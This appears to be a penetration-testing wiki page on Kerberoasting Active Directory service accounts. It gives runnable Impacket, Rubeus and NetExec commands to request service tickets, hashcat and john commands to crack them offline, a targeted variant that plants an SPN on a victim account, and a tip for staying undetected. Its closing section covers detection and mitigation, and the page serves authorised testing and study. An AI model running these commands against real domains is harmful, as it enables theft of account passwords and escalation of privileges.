---
tags: [pentest, kerberos, kerberoasting, ad, active-directory, initial-access, windows]
phase: 5
---
# Kerberoasting

Request service tickets (TGS) for accounts with SPNs (Service Principal Names) - the TGS is encrypted with the service account's NTLM hash (or AES). Crack offline.

[[06 - Gaining Access/00 - README|Folder index]]

## Why it works

Any authenticated domain user can request a TGS for any SPN. If the SPN belongs to a USER account (not a computer), the encryption key is derived from that user's password. Weak password → crack offline.

## Requirements

- ONE valid domain credential (any low-priv user works).
- The target user has a `servicePrincipalName` attribute set.

## Run

### From Linux (Impacket)

```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.5 -request -outputfile tgs.hash

# Specific user only
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.5 -request-user svc_sql -outputfile sql.hash
```

### From Windows (Rubeus)

```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt    :: only RC4-encrypted SPNs (crackable)
```

### From NetExec (no Impacket / Rubeus)

```bash
nxc ldap <dc-ip> -u user -p pass --kerberoasting tgs.hash
```

## Crack

```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5tgs --wordlist=rockyou.txt tgs.hash
```

## What hashes look like

```text
$krb5tgs$23$*svc_sql$CORP.LOCAL$svc_sql*$abcd1234...
            ^^                ^^ realm
            etype 23 = RC4 (crackable easily)
            etype 17/18 = AES (much slower but still possible)
```

## Pre-compute the SPN list

```bash
# Find Kerberoastable users without requesting tickets (recon-only)
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.5
# Lists ServicePrincipalName, Name, MemberOf, PasswordLastSet
```

Look for:
- Old `PasswordLastSet` (=password unchanged for years = likely weak).
- Service accounts in privileged groups (Domain Admins, etc.).

## Targeted Kerberoasting (when SPN doesn't exist yet)

If you have `GenericWrite` / `GenericAll` over a user account, you can set an SPN on them, then roast:

```bash
# Set an arbitrary SPN
targetedKerberoast.py -u attacker -p pass -d corp.local --request-user victim
# or PowerView:
Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/x'}
Rubeus.exe kerberoast /user:victim
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `KRB_AP_ERR_SKEW` | Sync clock with DC: `sudo ntpdate <dc>`. |
| `getSPN.py: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Wrong realm string or service down. |
| All SPNs return ETYPE 18 (AES-256) | Slower crack; still try. Worth attempting AES-targeted wordlist runs. |
| TGS won't crack with rockyou | Try `OneRuleToRuleThemAll.rule`. If still no, the password is strong - look for another path. |
| `request-user` returns "no SPN" | The user doesn't have an SPN. Try [[Targeted Kerberoasting]] above. |

## Detection

- Event ID **4769** on DC with `Ticket Encryption Type: 0x17` (RC4) for non-computer accounts.
- AD: enable AES-only encryption for service accounts (`msDS-SupportedEncryptionTypes`).
- gMSA accounts cannot be Kerberoasted - their passwords are managed by AD with 240+ characters.

> [!tip] Quietest variant
> `Rubeus.exe kerberoast /rc4opsec /outfile:h.txt` only requests tickets for RC4-supported users - avoids the slow AES ones AND looks less anomalous.
